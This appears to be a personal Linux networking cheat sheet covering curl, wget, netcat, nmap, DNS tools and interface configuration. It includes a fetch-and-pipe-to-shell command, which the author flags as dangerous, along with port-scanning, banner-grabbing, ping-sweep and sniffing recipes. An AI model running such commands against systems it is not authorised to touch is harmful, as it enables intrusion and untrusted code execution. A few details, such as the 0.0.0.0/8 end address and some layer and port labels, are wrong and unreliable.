exit
# NIC [Network Interface Card] NAMING SCHEMEs
    
    # Udev Naming; classical linux
    #  eth0; NIC
     
    # RHEL/aHOST 7 has Three [3] Naming Schemes
    
        #  - Udev Naming; eth{X}; classical naming
        #  - Logical Naming; .{VLAN} and :{ALIAS}
        #  - BIOS Naming; based on HW properties
        #     -- Embedded: em3;  em{1-N}
        #     -- PCI:      p6p1; p{SLOT#}p{PORT#}; 
        #  * Physical Naming; same as BIOS Naming
    
        # Predictable Network Interface Names
        #  systemd/udev automatically assigns predictable, stable NIC names.
        #  https://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames/
        #  https://github.com/systemd/systemd/blob/master/src/udev/udev-builtin-net_id.c#L20

        # e.g., eth0 => enp1s0 :: en=Ethernet, p1=PCI-bus1, s0=slot-0

    # -----[ Private IP Address Ranges ]--------------------  
    # CIDR block      Class    Start         End  
    # --------------  -----    -----------   ---------------  
    # 0.0.0.0/8        A       0.0.0.0       0.0.0.255         This Network  
    # 10.0.0.0/8       A       10.0.0.0      10.255.255.255    Private Use  
    # 127.0.0.0/8      A       127.0.0.0     127.255.255.255   Loopback  
    # 169.254.0.0/16   C       169.254.0.0   169.254.255.255   Link Local  
    # 172.16.0.0/12    B       172.16.0.0    172.31.255.255  
    # 192.168.0.0/16   C       192.168.0.0   192.168.255.255  
    # 224.0.0.0/4      D       224.0.0.0     239.255.255.255   Multicast  

# MIME types @ HTTP POST
    # If sending binary (non-alphanumeric) data, or significantly sized payload, use 
    'Content-Type: multipart/form-data'
    # Else send per URL-encoded string 
    'Content-Type: application/x-www-form-urlencoded'
    # Body is one giant query-string equivalent; 
     k1=v1&k2=v2
     # CAN send binary per URL-encoding, but is INEFFICIENT; one byte => three 7-bit bytes

# NIS (Network Information Service)  https://en.wikipedia.org/wiki/Network_Information_Service
# YP (Yellow Pages); precursor to NIS
# An NIS/YP system maintains and distributes a central directory of user and group information, 
# hostnames, e-mail aliases and other text-based tables of information in a computer network.
    # Password File  https://en.wikipedia.org/wiki/Passwd#Password_file
        /etc/passwd  # jsmith:x:1001:1000:Joe Smith,Room 1007,(234)555-8910,(234)555-0044,email:/home/jsmith:/bin/sh 
    # Shadow File    https://en.wikipedia.org/wiki/Passwd#Shadow_file
        /etc/shadow  # Shadow File; authentication hashes; the "x" of /etc/passwd
# LDAP (Lightweight Directory Access Protocol)  https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol
#... Successor to NIS/YP; based on DAP (X.500 protocol); DSA (Directory System Agent) is LDAP Server 
# DNS (Domain Name Service)
#... the LDAP for WANs 

# CLIENT  

    # BENCHMARKING

        # netperf :: Benchmarks between two hosts on a network
            # Unix domain sockets, TCP, SCTP, DLPI and UDP via BSD Sockets; predefined tests
            netperf # https://github.com/HewlettPackard/netperf  

        # Latency benchmarks of Unix IPC mechanisms 
            ipc-bench 

        # TCP/UDP benchmarking

            # iperf :: TCP/UDP benchmarking
                iperf
                # Network Performance Measurement and Tuning (TCP/UDP) 
                # @ AWS EC2 Benchmarking 
                # https://github.com/widdix/ec2-network-benchmark/blob/master/benchmark.yaml
                # Active measurements of the maximum achievable bandwidth on IP networks; 
                # Supports tuning of various parameters related to timing, protocols, and buffers; 
                # Reports measured throughput / bitrate, loss, and other parameters.
                # https://en.wikipedia.org/wiki/Iperf
                # https://www.tecmint.com/test-network-throughput-in-linux/  
                # https://github.com/esnet/iperf 
                # https://iperf.fr/  (binaries)
                iperf3 -s 
                iperf3 -s -f K  

        # HTTP 

            # wrk :: HTTP benchmarking tool  https://github.com/wg/wrk 
                wrk -t12 -c400 -d30s http://127.0.0.1:8080/index.html
                    -c, --connections  # number of HTTP connections to keep open 
                                       # N = connections/threads
                    -d, --duration:    # duration of test, e.g. 2s, 2m, 2h
                    -t, --threads:     # number of threads to use
                    -s, --script:      # LuaJIT script, see SCRIPTING
                    -H, --header:      # HTTP header to add to request wrk"
                        --latency:     # print detailed latency statistics
                        --timeout:     # record max timeout @ no response thereunder

            # ApacheBench ('apache2-utils' pkg) :: HTTP benchmarking
                # Load test an API endpoint
                ab -c $_CONCURRENTLY -n $_ITERATIONS "$_URL"
                # E.g., 
                ab -c 100 -n 10000 http://${_HOST}/
                
                # If "socket: Too many open files (24)" @, e.g., `... -c 2000`
                # then increase MAX open FDs:
                    ulimit -n 10000  # 1024 is default

            # hey :: ApacheBench replacement (Golang)  https://github.com/rakyll/hey 
                # Load test an API endpoint
                # Reports include LATENCIES; distributions, percentiles, ...
                # To install, download binary, `cp` to /bin/hey, then `chmod +x /bin/hey`. 
                hey -m GET -c 10 -n 10000 "http://localhost:3000/v1/u" 

            # pprof @ Golang  https://golang.org/pkg/net/http/pprof/  
                go pprof ...
                
            # Vegeta @ GitHub  https://github.com/tsenart/vegeta 
                # HTTP load testing tool (CLI) and library. 
                # Usage example:  https://medium.com/dm03514-tech-blog/sre-performance-analysis-tuning-methodology-using-a-simple-http-webserver-in-go-d475460f27ca

    # cURL is a tool to transfer data between client (itself) and server; NOT for downloading websites  
    # GitHubGist  https://gist.github.com/subfuzion/08c5d85437d5d4f00e58  
        curl [options] URL         # Okay to omit protocol

            -H, --header HEADER    # set HTTP request header(s); one per `-H '...'` switch
            -X, --request METHOD   # set request method; GET|POST|PUT|DELETE; default is GET 
            -I, --head             # Show headers ONLY
            -D, --dump-header FILE # Show (Dump) response headers; write to FILE; `-` for STDOUT  
            -s, --silent           # Silent mode; sans progress
            -S, --show-error       # Show error even with -s
            -d, --data DATA        # HTTP POST data; string(s); multiple `-d key#=val#` okay 
            --data-ascii DATA      # HTTP POST ASCII data
            --data-binary DATA     # HTTP POST binary data 
            --compressed           # Detect compression and auto-decompress   
            -o, --output FILE      # write output to FILE; all concatenated into ONE file
            -L, --location         # follow redirects; intelligently handle server response codes 
            --create-dirs          # used w/ `-o`; creates local dirs as necessary 
            -T, --upload-file FILE # upload FILE; create FILE [@ server-root] if not exist
            --connect-timeout SECS # max time to connect
            -m, --max-time SECS    # max time allowed for transfer [req|resp]; timeout
            -A UA, --user-agent UA # send `User-Agent` header
            -s, --silent           # silences progress meter & err msgs
            -v, --verbose          # Verbose report
            -u, --user USER:PASS   # credentials; username & password 
            -x, --proxy [PROTOCOL://]HOST[:PORT]  # to use specified proxy 
            --trace FILE --trace-time # Write trace/time info to FILE   
            -w, --write-out @FILE  # FORMAT the OUTPUT per txt FILE
                   # https://stackoverflow.com/questions/18215389/how-do-i-measure-request-and-response-times-at-once-using-curl
                    time_namelookup:  %{time_namelookup}s\n
                       time_connect:  %{time_connect}s\n
                    time_appconnect:  %{time_appconnect}s\n
                   time_pretransfer:  %{time_pretransfer}s\n
                      time_redirect:  %{time_redirect}s\n
                 time_starttransfer:  %{time_starttransfer}s\n
                                    ----------\n
                         time_total:  %{time_total}s\n
                # To STDOUT: 
                curl -s -w "@curl-format.txt" -o /dev/null ...

        # Pull a script to ./a.sh; quitely, follow redirects, rpt only on err
            curl -fsSL -o a.sh https://foo.com/path/to/a.sh

        # Online Golang tool: cURL-to-Golang: https://mholt.github.io/curl-to-go  

        # curl-based sites 
            curl wttr.in/salt+lake+city  # Weather/forecast per location (defaults to local) 
            curl cheat.sh/chmod/755      # cheats per tool (defaults to menu) 
            curl ifconfig.me             # WAN IP Address (Gateway's public IP Address)
  
        # cURL sends Request Header:
            User-Agent: curl/7.58.0  # Alias this using -A 'USER AGENT STRING'
                # Firefox
                -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
                # Chrome
                -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'

        # Simplest request (may omit protocol)
            curl wttr.in 

        # Send data to server /endpoint
            curl ${_HOST}/endpoint -d 'foo bar'           # POST
            # ... per explicit Request Method 
            curl -X PUT ${_HOST}/endpoint -d 'foo bar'    # PUT

        # Generate LOAD; create demand on server
            seq 10000 |xargs -Iz curl -4 '${_HOST}/index.html'
            # or
            while [ true ]; do curl -4 '${_HOST}/index.html' ; done

        # CORS Test
            curl -I -X GET -H "Origin: http://wants.it" --verbose \
                'http://host.has/resource'

        # Header info only 
            curl -Is foo.com

        # DOWNLOAD +EXTRACT an ARCHIVE   
            curl -L https://${_HOST}/path/foo.tar.gz | tar -zxf -  
            
        # Validate URL (test server); send request for URL ...  
            curl -I http://google.com/bogus  # HTTP 404 (Not Found) 

        # POST (HTTP method) 
            curl -X POST http://${_HOST} -d title=foo -d date=1421044443 \
                -d body='beep boop!' 
            # JSON (Sans whitespace!)
            export json='{"k1":["a1","a2"],"k2":"v2","k3":[{"foo":"bar","q":123},{"id":"a1","ping":"pong"}]}'
            curl -X POST -H 'Content-Type: application/json' \
                -d "$json" http://${_HOST}/v1/api

        # PUT (HTTP method) :: CREATE [UPLOAD] FILE (file.txt), IF NOT EXIST @ server-root  
            curl -X PUT -d ' Hello from server @ ${_HOST}' http://${_HOST}/file.txt 
            # Validate action
                curl http://${_HOST}/file.txt  # 'Hello from server @ ${_HOST}'  
        
        # DELETE (HTTP method) :: delete FILE (file.txt), @ server-root 
            curl -X DELETE http://${_HOST}/file.txt  
            # Validate action
                curl http://${_HOST}/file.txt  # 'File not found'  

        # CRUD @ API; JSON server (JWT-authenticated endpoints); + jq filtering
            # List products
            curl -X GET -s \
                -H 'Content-Type: application/json' \
                -H "Authorization: Bearer ${_TOKEN}" \
                http://${_HOST}:${_PORT}/v1/products | jq . 

            # CREATE new product (POST); filter API return to retreive its ID
            _JSON='{"name":"Foo bar","cost":100,"quantity":3}'
            _ID="$(curl -X POST -s \
                -H 'Content-Type: application/json' \
                -H "Authorization: Bearer ${_TOKEN}" \
                -d "${_JSON}" http://${_HOST}:${_PORT}/v1/products \
                | jq -r .id)"

            # RETRIEVE product (created just now) per ID
            curl -X GET -s \
                -H 'Content-Type: application/json' \
                -H "Authorization: Bearer ${_TOKEN}" \
                http://${_HOST}:${_PORT}/v1/products/${_ID} | jq . 

            # UPDATE existing product (PUT); sans one key 
            _JSON='{"name":"FooBar v2","quantity":555}'
            curl -X PUT -s \
                -H 'Content-Type: application/json' \
                -H "Authorization: Bearer ${_TOKEN}" \
                -d "${_JSON}" http://${_HOST}:${_PORT}/v1/products/${_ID}  

            # DELETE existing product 
            curl -X DELETE -s \
                -H 'Content-Type: application/json' \
                -H "Authorization: Bearer ${_TOKEN}" \
                http://${_HOST}:${_PORT}/v1/products/${_ID} | jq . 


    # wget :: The non-interactive network downloader.
        wget [options] URL 

            -S, --server-response   # print HTTP response headers to STDOUT (before downloading all else)
            --spider                # only check validity of URL; exit-code is `0` only if resource exists
            -m, --mirror            # `-r -N -l inf --no-remove-listing` 
            -r, --recursive         # recursive retrieving; default DEPTH is 5 
            -l DEPTH, --level=DEPTH # recurse to `DEPTH` level(s); `0` or `inf` for infinite
            -p , --page-requisites  # download all files necessary to properly display page.
            -k, --convert-links     # after download, convert links to those downloaded
            -U UA, --user-agent=UA  # specify request-header `User-Agent` as `UA` 
            -E, --adjust-extension  # fix extensions for `.asp ` etal content.
            -H                      # span hosts; for links (css, js, png, ...) external to URL's host 
            -D DOMAIN_LIST          # comma-separated list of domain names to span; use w/ `-H`
            -t N, --tries=N         # retry link(s) `N` times
            -O FILE                 # redirect ALL response bodies to `FILE` (concat); 
            -O -                    # ... to STDOUT

        # Download and execute a shell script (COMMON and DANGEROUS)
            wget -O - $_bash_script_URL | sh
        # Download server response body to FILE @ $PWD; report meta @ STDOUT
            wget $_URL 
            # IF compressed ...
                $ file 'index.html'  # get file info
                index.html: gzip compressed data, from Unix 
                $ mv 'index.html' 'index.html.gz'  # move (rename) to 'index.html.gz'
                $ gunzip 'index.html.gz'           # uncompress to 'index.html'

        # Download a Web page +ALL REQUISITES (css, js, images), posing as specified User-Agent. 
        # NOPE -- FAILS -- NEARLY NEVER WORKS
            wget -mpkE -U $_UA $_URL  # mirror, page-requisites, convert-links, adjust-extension 
            # UA @ Android 4
                'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30' 
            # UA @ Win7 Mozilla 
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0'
            # UA list https://developers.whatismybrowser.com/useragents/explore/operating_system_name/android/  
        # print filtered server-response headers (only) to STDOUT 
            wget -S --spider $_URL |& grep 'Last-Modified'

        # Download a website; an ENTIRE WEBSITE 
            export _UA='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0'
            wget -U $_UA --recursive --convert-links $_URL

            # OR 
            export _DOMAIN=foo.com; export _URL=foo.com/bar
            wget \
                --recursive \
                --no-clobber \
                --page-requisites \
                --html-extension \
                --convert-links \
                --restrict-file-names=windows \
                --domains $_DOMAIN \
                --no-parent \
                $_URL

    # hostname (change does NOT persist)
        hostname 
            -a, --alias             # alias names
            -A, --all-fqdns         # all long host names (FQDNs)
            -b, --boot              # set default hostname if none available
            -d, --domain            # DNS domain name
            -f, --fqdn, --long      # long host name (FQDN)
            -F, --file              # read host name or NIS domain name from given file
            -i, --ip-address        # addresses for the host name
            -I, --all-ip-addresses  # all addresses for the host
            -s, --short             # short host name
            -y, --yp, --nis         # NIS/YP domain name
        
        # @ Docker container 
        hostname        # ctnr ID
        hostname -i     # ctnr Private IP; eth1

    # hostnamectl : set (PERSISTs)
        hostnamectl set-hostname $newHostName
        # Transient: Received from network configuration.
        # Static:    Provided by the kernel.
        # Pretty:    Provided by the user.
        
        /etc/hostname # Contains static hostname
            echo "$newHostName" |sudo tee /etc/hostname

    # whois :: Domain Name info: 
        whois HOSTNAME  # regsitry ID, registrar, registrar server, update/creation/expiration dates

    # host :: IP <==> domainname 
        host -t a HOSTNAME|IP     # IP (per authoritative query)
        host -C HOSTNAME|IP       # Nameserver(s); SOA records
        host -d HOSTNAME|IP       # verbose

        nslookup HOSTNAME         # returns IP Address 
        nslookup IP               # returns Domain Name 

            # @ Docker container 
                nslookup $(hostname)
                # Server:         127.0.0.11
                # Address:        127.0.0.11:53

                # Non-authoritative answer:
                # Name:   871817abc96b
                # Address: 10.0.37.5

                # Non-authoritative answer:
                # *** Can't find 871817abc96b: No answer
                
                #... where ...
                hostname
                871817abc96b
                hostname -i
                10.0.37.5


        getent hosts HOSTNAME     # IPv6
        getent ahostsv4 HOSTNAME  # IPv4

# NETWORK ANALYSIS UTILITIES
    hostname [HOSTNAME]  # show or [temporarily] change HOSTNAME
    dnsdomainname        # show LAN domain
    ping -c 1 ROUTER_IP  # CONNECTIVITY TEST to Gateway Router; 1 ping
    ping -f ROUTER_IP    # flood ping; BANDWIDTH TEST [@ LAN only!]]
    host HOSTNAME        # DNS info
    dig HOSTNAME         # DNS info; @SUCCESS: 'status: NOERROR'; @FAIL: 'status: NXDOMAIN'
    traceroute           # hostname resolution test; routing info [blocked by many routers]
    
    # TEST CONNECTIVITY 
        export ip=10.0.101.130
        export port=22

        traceroute -n -T -p $port $ip
        
        # My Traceroute : combine traceroute + ping
        # https://en.wikipedia.org/wiki/MTR_(software)
        mtr -n -T -c 200 $ip --report # Per TCP (vs default; ICMP)

        #... neither are pre-installed @ `Ubuntu 18.04`

    # TEST for OPEN PORT 
        nc -vz 127.0.0.1 $port

        # # @ Windows CMD
        # netstat -aon | findstr :%_port%

    nmap                 # advanced tool regarding remote services availability 
                         #   WARNING: nmap use considered HOSTILE by ISPs etal
                         #   @ Win: `chocolatey install nmap`
        nmap HOST                       # Regular scan 
        nmap -sn HOST                   # Ping scan
        nmap -T4 -F HOST                # Quick scan
        nmap -sn --traceroute HOST      # Quick traceroute
        nmap -T4 -A -v HOST             # Intense scan  
        nmap -p 1-65535 -T4 -A -v HOST  # Intense scan, all TCP ports
        # Slow comprehensive scan
        nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" HOST 


    nm-tool  # RedHat; NetworkManager Tool; reports status
             # ... Type, driver, speed, IP, MAC, Gateway IP, DNS, Subnet Netmask

    ipcalc IP    # get Network Address / CIDR, Netmask, Wildcard, ... all the things
        $ ipcalc 194.59.251.140
        Address:   194.59.251.140       11000010.00111011.11111011. 10001100
        Netmask:   255.255.255.0 = 24   11111111.11111111.11111111. 00000000
        Wildcard:  0.0.0.255            00000000.00000000.00000000. 11111111
        =>
        Network:   194.59.251.0/24      11000010.00111011.11111011. 00000000
        HostMin:   194.59.251.1         11000010.00111011.11111011. 00000001
        HostMax:   194.59.251.254       11000010.00111011.11111011. 11111110
        Broadcast: 194.59.251.255       11000010.00111011.11111011. 11111111
        Hosts/Net: 254                   Class C

    mii-tool     # media-independent interface [MII] status [OBSOLETE; use ethtool]
    ethtool NIC  # get info on NIC, e.g., 'ethtool eth0' 
            -i NIC   # driver info
            
    ss      # Socket Statistics; IP:PORT
     -r     # resolve names
     -n     # numeric; don't resolve names
     -p     # incl. processes
     -at4r  # all-sockets, tcp, IPv4, resolve-names

    netstat # Network Connections, routing tables, ... stats ... [OBSOLETE; use 'ss']
    netstat -i       # Interface Table; packet info for network cards
    netstat -tulpen  # Active Internet connections; listening ports
    netstat -nr      # IP Routing Table; numeric [IP] instead of HOSTNAME
    netstat -a       # Active UNIX domain sockets; list all network ports
    netstat -at      # Active Internet Connections; list all TCP ports
    netstat -s       # Stats, per protocol, for all ports

    # Netcat 
    # READ/WRITE to/from TCP/UDP connections; CREATE SERVER, LISTEN to server,
    # send packets, PORT SCANNING/listening, FILE TRANSFERS; IPv4/IPv6 
    # https://linux.die.net/man/1/nc   https://en.wikipedia.org/wiki/Netcat
    nc 
        [-46DdhklnrStUuvzC] [-i interval] [-p source_port] [-s source_ip_address] [-T ToS] 
        [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]] [hostname] [port[s]]

        -l # to listen; default is to initiate; do NOT use -l with -p, -s, or -z
        
        # HOW-TO ...
        
            # build a very basic client/server model ...
            nc -l 1234         # listen on port 1234   [e.g., @ terminal-1]
            nc 127.0.0.1 1234  # connect to port 1234  [e.g., @ terminal-2]
            # thereafter, anything typed at one terminal will be concatenated to the other; 2-way. 

            # Create a UNIX Socket 
            # -U : Unix Socket file 
            # -l : act as the server-side; listen for incoming connections.
            nc -U /tmp/demo.sock -l
            # List file info lsof(8) man page : https://linux.die.net/man/8/lsof
            lsof -U # List info of all UNIX socks
            lsof /tmp/demo.sock # Info of only this one

        # FAST Data Transfer 
            # @ target machine; listen, with output captured into a file
                nc -l 8888 > target-FILE-path
            # @ source machine; connect to the listen process, feeding it the file
                nc host.example.com 8888 < source-FILE-path 
            # ... the connection will close automatically upon transfer completion.
            
        # FASTer [nc + pigz]  http://petrushin.org/
            # @ source machine; tar option `-` sets .tar output (BIGFILE.gz) to STDOUT (piped)
                tar -cf - BIGFILE | pigz | nc -l -p 8888  # pigz is a mutlithreaded gz archiver
            # @ target machine; tar option `-` sets source .tar (BIGFILE.gz) to STDIN (piped) 
                nc host.example.com 8888 | pigz -d | tar xf - -C TARGET_DIR

            # Parallel Implementation of GZip; used w/ Netcat (nc)  http://www.zlib.net/pigz/
            pigz  # file|STDIN compressed to file.gz|STDOUT; 

        # Talk to Server :: request/recieve server response [including headers] @ web site [server], per GET
            echo -n "GET / HTTP/1.0\r\n\r\n" | nc host.example.com 80 # can filter[out] headers w/ sed utility

        # Port Scanning :: test/find/connect to any OPEN PORTs  [nmap utility is better]
            nc -z host.example.com 20-30 # -z; report open ports, rather than initiate a connection
            # ... reports , e.g., ...
                'Connection to host.example.com 22 port [tcp/ssh] succeeded!'
                'Connection to host.example.com 25 port [tcp/smtp] succeeded!'

            # test/find/show which server software/version is running; often contained within greeting banners.
            # Must open/close connection, so specify timeout, -w flag, or pipe a "QUIT" command to the server:

                # open/close; scanning ports 20-30
                    echo "QUIT" | nc host.example.com 20-30 
                
                # Open/close per TCP, host port 42, source port 31337, with 5 sec timeout:
                    nc -p 31337 -w 5 host.example.com 42 

                # Setup a ONE-SHOT WEBSERVER on port 8088 of thisNODE [e.g., localhost] to transmit fooFILE
                    { echo -ne "HTTP/1.0 200 OK\r\nContent-Length: $(wc -c <fooFILE)\r\n\r\n"; cat fooFILE; } | nc -l 8088
                    # The file can then be accessed @ [once, by 1st requestor]; http://thisNODE:8080/ 

    # Network Mapper :: Security Scanner / Port Scanner  https://en.wikipedia.org/wiki/Nmap
        nmap serverName  # features: Host discovery, Port scanning, Version detection, OS detection  

    # CAPTURE/INSPECT per PROTOCOL  
        wireshark  # gui
        
        tcpdump    # cli; dump traffic on a network 
        
            -A  # print each packet in ASCII; for capturing web pages. 
            -X  # print headers & data of each packet
            tcpdump -v -i eth0 port 2377     # Docker Swarm cluster-management traffic
            tcpdump 'tcp port 80' -X         # all tcp packets to/from port 80
            tcpdump host foo                 # all traffic to/from host foo
            tcpdump ip host foo and not bar  # all IP packets between foo and any host except bar

    # DNS lookup utilities

        nslookup # DNS info; query Internet (DNS) name servers; interactively if no args

        nslookup $_DOMAIN            # get info on $_DOMAIN name, e.g., www.google.com
        nslookup -query=mx $_DOMAIN  # query Mail Exchanger Record 
        nslookup -type=ns $_DOMAIN   # query Name Server 
        nslookup -type=any $_DOMAIN  # query DNS Record
        nslookup -type=soa $_DOMAIN  # query Start of Authority
        nslookup -port 56 $_DOMAIN   # query port number

        dig $_DOMAIN                 # query DNS (yum install bind-utils; apt install dnsutils)
        dig $_DOMAIN | grep 'time'   # time (ms) to resolve
        dig $_DOMAIN +nssearch       # SOA record per Authoritative Name Server, & RESOLVE TIME
        # Per DNS Name Server IP Address; resolve time of $_DOMAIN name
        dig @${_DNS_NAME_SERVER_IP} $_DOMAIN | grep time  

    # DHCP release/renew IP Address
        dhclient 
        # LAN
        sudo dhclient -r 'eth0' && sudo dhclient 'eth0'
        # @ WLAN
        sudo dhclient -v -r 'wlan0' && sudo dhclient -v 'wlan0'

    # Reset NIC 
        ifdown/ifup  # legacy utilities
        # @ LAN
        sudo ifdown 'eth0' && sudo ifup 'eth0'
        # @ WLAN
        sudo ifdown 'wlan0' && sudo ifup 'wlan0'

        # Newer
        ip link set $ADAPTER up|down

    # Restart Network 
        # RHEL/CentOS/Fedora 
        /etc/init.d/network restart

        # Debian/Ubuntu 
        /etc/init.d/networking restart 

# CONFIGURE NIC   

    # iproute2 library; https://en.wikipedia.org/wiki/Iproute2
    #   ip, ss, bridge, rtacct, rtmon, tc, ctstat, lnstat,  
    #   nstat, routef, routel, rtstat, tipc, arpd   
    iproute2        
    
    Legacy utility    Obsoleted by                  Note
    --------------    --------------------------    --------------------------
    ifconfig          ip addr, ip link, ip -s       Address and link config
    route             ip route                      Routing tables
    arp               ip neigh                      Neighbors
    iptunnel          ip tunnel                     Tunnels
    nameif            ifrename, ip link set name    Rename network interfaces
    ipmaddr           ip maddr                      Multicast
    netstat           ip -s, ss, ip route           Show various network stats

    # Ubuntu 
        netplan # Changes PERSIST 
        netplan --debug apply
        /etc/netplan/... # Config files auto-applied on boot

    # NOTE: newer utils have horrible stdout, so legacy utils remain in use.
    
    ip  # configure/show routing, devices, policy routing and tunnels
        # replaces 'ifconfig' & 'route' utilities
        # changes do NOT persist; used as config-test tool; config per apropos files
                    
        ip help|address|neigh|route|addr|link

        ip a  # List all addresses; per interface
            -c  # color highlights
            alias ip='ip -c'
            
        ip neigh  # show IP and MAC of all neighbors, and device/interface

            192.168.1.2 dev eth0 lladdr 00:21:29:ae:77:b6 STALE      # CB router [eth0 connected]
            192.168.1.1 dev eth0 lladdr e0:3f:49:9a:8b:b8 REACHABLE  # Gateway router
            192.168.1.101 dev eth0 lladdr 00:1c:c0:4d:94:bf STALE    # XPC

        # ... that available @ eth1
        ip neigh show dev eth1

        for ip in $(seq 1 254); do 
            ping -c 1 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo "192.168.1.$ip UP" || : 
        done

        # @ Transport Layer [L4]
        ip addr                # show IP and MAC of all devices/interfaces 
        ip addr show dev eth0  # show IP and MAC of eth0 device            

            2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
                 link/ether 00:23:54:7c:b8:64 brd ff:ff:ff:ff:ff:ff
                 inet 192.168.1.183/24 brd 192.168.1.255 scope global eth0
                 inet6 fe80::223:54ff:fe7c:b864/64 scope link 
                        valid_lft forever preferred_lft forever
                        
            # @ Docker container :: `hostname -i` is 'eth1' (10.0.37.5)
            /app # ip addr
            1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
                link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
                inet 127.0.0.1/8 scope host lo
                valid_lft forever preferred_lft forever
            2: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN qlen 1000
                link/ipip 0.0.0.0 brd 0.0.0.0
            3: ip6tnl0@NONE: <NOARP> mtu 1452 qdisc noop state DOWN qlen 1000
                link/tunnel6 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00 brd 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
            10317: eth0@if10318: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1450 qdisc noqueue state UP
                link/ether 02:42:0a:00:00:72 brd ff:ff:ff:ff:ff:ff
                inet 10.0.0.114/24 brd 10.0.0.255 scope global eth0
                valid_lft forever preferred_lft forever
            10319: eth2@if10320: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
                link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
                inet 172.22.0.3/16 brd 172.22.255.255 scope global eth2
                valid_lft forever preferred_lft forever
            10329: eth1@if10330: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1450 qdisc noqueue state UP
                link/ether 02:42:0a:00:25:17 brd ff:ff:ff:ff:ff:ff
                inet 10.0.37.23/24 brd 10.0.37.255 scope global eth1
                valid_lft forever preferred_lft forever

        ip addr add dev eth0 10.0.0.10/24  # add an IP address to NIC; always include subnet
                                           # ifconfig FAILs to see this newly added IP Address
        
        ip maddr show eth0                 # show MAC

        # @ Data Link Layer [L2]

        ip link            # show NICs; MAC of all devices 
        # Turn Adapter on|off
        ip link set $ADAPTER up|down  # e.g., LAN (eth0) or WLAN/WiFi (wlan0) adapters
        ip -s link         # show statistics; Physical Layer info
        ip link show eth0  # show MAC of eth0

            2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
                link/ether 00:23:54:7c:b8:64 brd ff:ff:ff:ff:ff:ff

        ip -4 route     # route to Gateway; IPv4

            192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.183  metric 1 
            default via 192.168.1.1 dev eth0  proto static 

            # @ Docker container 
            /app # ip route 
            default via 172.22.0.1 dev eth2  #... route @ DEFAULT PORT (80)
            10.0.0.0/24 dev eth0 scope link  src 10.0.0.81
            10.0.37.0/24 dev eth1 scope link  src 10.0.37.5
            172.22.0.0/16 dev eth2 scope link  src 172.22.0.5

        ip -r route  # route to Gateway, resolve IP to name of Gateway

            192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.183  metric 1 
            default via router.asus.com dev eth0  proto static 

        ip route list 0/0  # list first entry ?

        ip route add 20.0.0.0/8 via 192.168.1.1  # add a route
        
        ip route add default via 192.168.50.100  # add default gateway
        
        ip link set NICname up|down  # enable/disable [NOT persist]
        
    ifconfig  # OBSOLETE since 1996 !!! : use `ip` utility instead
    
        ifconfig -a                   # show info for all adapters
        ifconfig eth0 down            # disable NIC
        ifconfig eth0 up              # enable NIC
        ifconfig eth0 $ip             # assign IP to NIC
        ifconfig eth0 broadcast $bip  # change broadcast Address of NIC
        ifconfig eth0 netmask $mask   # change subnet mask of NIC
        
    # WiFi (WLAN)
    iwconfig  # wireless ip-config/info utility
        ip addr  # list all adapters; eth0, wlan0, ...    
        iwconfig 'wlan0'  # Show info of wlan0 adapter

        # Connect w/ WiFi password
        iwconfig wlan0 essid $_WIFI_SSID key s:$_WIFI_PASSWORD

    # Bridge (ethernet) configuration; setup, maintain, inspect
    brctl  # https://linux.die.net/man/8/brctl
        apt-get install bridge-utils
        brctl show

    # Bridge addresses and devices; show, manipulate
    bridge fdb show dev $name
      
    # Get current SSID Listing ...
    iwlist 'wlan0' scan | grep 'ESSID'

    route # OBSOLETE; fails to see 'src' here; use 'ip -r route'
        Kernel IP routing table
        Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
        192.168.1.0     *               255.255.255.0   U     1      0        0 eth0
        default         router.asus.com 0.0.0.0         UG    0      0        0 eth0

    arp [-av]  # show ARP table
        # =>
        android-d0b1f4de867c0bd4.aDOMAIN (192.168.1.205) at <incomplete>  on br0
        CB.aDOMAIN (192.168.1.2) at <incomplete>  on br0
        XPC.aDOMAIN (192.168.1.101) at 00:1C:C0:4D:94:BF [ether]  on br0
        ? (192.168.1.213) at 00:21:39:AE:77:B8 [ether]  on br0
        c-53-163-108-1.hsd1.blah.blah.net (53.163.108.1) at 00:01:4C:70:A4:46 [ether]  on eth0

        routerUser@SMB:/tmp/home/root#

    dhclient # Dynamic Host Configuration Protocol Client 
        sudo dhclient -v -r eth0  # release IP
        sudo dhclient -v eth0     # renew IP

        sudo service network restart    # restart network @ RHEL/aHOST 6

    # bridge-utils (Bridge Utilities), e.g., to SNIFF the (Gateway-to-ISP) network 

        brctl addbr br0             # Add (Create) a bridge 
        brctl addif br0 eth0 eth1   # Bond interfaces to bridge 
     
